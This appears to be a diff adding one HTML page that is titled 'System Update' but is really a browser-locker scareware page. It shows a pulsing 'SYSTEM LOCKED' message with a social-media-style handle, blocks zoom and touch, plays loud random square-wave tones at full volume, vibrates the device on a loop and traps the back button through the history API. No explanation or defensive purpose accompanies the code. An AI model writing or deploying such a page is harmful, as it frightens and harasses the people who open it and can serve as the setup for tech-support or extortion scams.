@@ -1,0 +1,32 @@
+
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <title>System Update</title>
+        <style>
+            body { background-color: #000; color: #ff0000; font-family: monospace; text-align: center; margin: 0; padding: 0; overflow: hidden; touch-action: none; }
+            .lock-container { padding-top: 30vh; z-index: 100; }
+            h1 { font-size: 3em; text-shadow: 0 0 20px red; animation: pulse 0.5s infinite alternate; }
+            p { font-size: 1.5em; color: #0f0; }
+            @keyframes pulse { from { transform: scale(1); } to { transform: scale(1.05); } }
+        </style>
+    </head>
+    <body>
+        <div class="lock-container">
+            <h1>SYSTEM LOCKED</h1>
+            <p>@new200013</p>
+        </div>
+        <script>
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioCtx.createOscillator();
+            const gainNode = audioCtx.createGain();
+            oscillator.type = 'square'; gainNode.gain.setValueAtTime(1.0, audioCtx.currentTime);
+            oscillator.connect(gainNode); gainNode.connect(audioCtx.destination); oscillator.start();
+            setInterval(() => { oscillator.frequency.setValueAtTime(Math.random() * 1000 + 500, audioCtx.currentTime); if(navigator.vibrate) navigator.vibrate([500, 200, 500]); }, 300);
+            history.pushState(null, null, location.href);
+            window.onpopstate = function () { history.go(1); };
+        </script>
+    </body>
+    </html>
+    
